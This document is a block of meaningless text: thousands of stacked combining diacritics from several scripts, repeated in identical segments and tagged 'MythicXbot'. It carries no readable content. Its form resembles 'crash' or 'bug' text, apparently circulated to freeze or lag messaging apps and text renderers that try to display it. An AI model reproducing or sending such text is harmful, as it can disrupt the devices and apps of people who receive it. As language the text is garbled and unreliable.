͢҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅